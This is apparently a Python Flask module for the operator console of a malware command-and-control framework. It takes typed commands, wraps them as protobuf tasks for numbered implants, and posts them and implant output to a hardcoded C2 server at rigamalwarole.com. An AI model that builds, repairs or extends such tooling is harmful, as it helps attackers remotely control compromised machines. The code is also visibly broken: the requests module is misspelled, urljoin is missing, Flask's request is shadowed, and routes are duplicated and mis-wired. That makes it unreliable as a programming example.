from flask import Blueprint, render_template, request, redirect, url_for
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
from wtforms.validators import DataRequired, Length
import secrets
from cvnt.client_pb2 import *

client = Blueprint('client', __name__, template_folder='templates')
c2 = "https://rigamalwarole.com"
task_list = "/task/list"
task_create = "task/create"
register = "/register"
request = "/request"
response = "/response"
packet = "/packet"


class Terminal(FlaskForm):
    cmd = StringField('=> ', validators=[DataRequired(), Length(1, 400)])

@client.route('/client', methods=['GET', 'POST'])
def index():
    form = Terminal()
    whole = None
    error_message = None  # Initialize the error message to None
    if form.validate_on_submit():
        whole = form.cmd.data
        parts = whole.split(' ', 1)
        leftoverstring = ''
        try:
            firstword, leftoverstring = parts
        except: 
            firstword = parts[0]
        if valid_command(firstword):
            msg = Command()
            msg.cmd = firstword
            msg.args = leftoverstring
            print('Slay Baddies your command was received successfully!')
            #error_message = analyze_input(firstword, leftoverstring)
            handle_t_request(1, msg.cmd, msg.args)
        else:
            error_message = 'Ivalid Command Loser :('  # Set the error message
    return render_template('index.html', form=form, cmd=whole, error_message=error_message)

def valid_command(cmd):
    filename = "commands.txt"
    with open(filename) as file:
        lines = [line.rstrip() for line in file]
    if cmd not in lines:
        return False
    return True

def analyze_input(cmd, args):
    pass

@client.route(request, methods=["POST"])
def handle_t_request(implant_id, cmd, args):
    print(f'REQUEST FROM CLIENT')
    r = ClientTaskRequest()
    r.ImplantID = implant_id
    r.JobID = 1
    r.function = cmd
    r.inputs = args
    out = r.SerializeToString()
    r = reuqests.post(urljoin( c2, request), data = out)

@client.route(response, methods=["POST"])
def handle_t_response(implant_id, jobID, output):
    print(f'RESPONSE FROM CLIENT')
    r = ClientTaskResponse()
    r.ImplantID = implant_id
    r.JobID = jobID
    r.Output = output
    out = r.SerializeToString()
    r = reuqests.post(urljoin( c2, response), data = out)

@client.route(response, methods=["POST"])
def handle_packet(msg, csrf):
    print(f'PACKET FROM CLIENT')
    r = Packet()
    r.Message = msg
    r.CSRF = csrf
    out = r.SerializeToString()
    r = reuqests.post(urljoin( c2, csrf), data = out)
